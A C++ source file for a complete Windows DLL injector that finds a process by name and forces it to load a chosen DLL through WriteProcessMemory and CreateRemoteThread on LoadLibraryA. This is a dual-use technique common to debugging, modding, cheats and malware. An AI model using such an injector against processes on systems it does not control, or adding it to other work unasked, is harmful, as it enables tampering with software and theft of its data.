#include <iostream>
#include <windows.h>
#include <string>
#include <TlHelp32.h>

// Define a typedef struct for ProcessEntry
typedef struct ProcessEntry {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    TCHAR szExeFile[MAX_PATH];
} ProcessEntry;

// Function to find the process ID of a process by its name
DWORD FindProcessID(const std::wstring& processName) {
    ProcessEntry processInfo;
    processInfo.dwSize = sizeof(processInfo);

    // Create a snapshot of all running processes
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    Process32First(processesSnapshot, reinterpret_cast<PROCESSENTRY32*>(&processInfo));
    do {
        // Compare the process name with the target process name
        if (!processName.compare(processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    } while (Process32Next(processesSnapshot, reinterpret_cast<PROCESSENTRY32*>(&processInfo)));

    CloseHandle(processesSnapshot);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Usage: LoadDll.exe <dll_path> <process_name>" << std::endl;
        return 1;
    }

    std::string dllPath(argv[1]);
    std::wstring processName(argv[2], argv[2] + strlen(argv[2]));

    // Find the process ID of the target process
    DWORD processID = FindProcessID(processName);
    if (processID == 0) {
        std::cout << "Error: Could not find process." << std::endl;
        return 1;
    }

    // Open the target process with required access
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!processHandle) {
        std::cout << "Error: Could not open process." << std::endl;
        return 1;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID remoteDllPath = VirtualAllocEx(processHandle, NULL, dllPath.size() + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remoteDllPath) {
        std::cout << "Error: Could not allocate memory in target process." << std::endl;
        CloseHandle(processHandle);
        return 1;
    }

    // Write the DLL path into the allocated memory in the target process
    if (!WriteProcessMemory(processHandle, remoteDllPath, dllPath.c_str(), dllPath.size() + 1, NULL)) {
        std::cout << "Error: Could not write to process memory." << std::endl;
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // Get the address of the LoadLibraryA function
    FARPROC loadLibraryAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr) {
        std::cout << "Error: Could not get LoadLibraryA address." << std::endl;
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // Create a remote thread in the target process to load the DLL
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteDllPath, 0, NULL);
    if (!remoteThread) {
        std::cout << "Error: Could not create remote thread." << std::endl;
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // Wait for the remote thread to complete
    WaitForSingleObject(remoteThread, INFINITE);

    // Free the memory allocated in the target process for the DLL path
    VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);

    // Close the handles for the remote thread and the target process
    CloseHandle(remoteThread);
    CloseHandle(processHandle);

    std::cout << "DLL successfully loaded into target process." << std::endl;
    return 0;
}
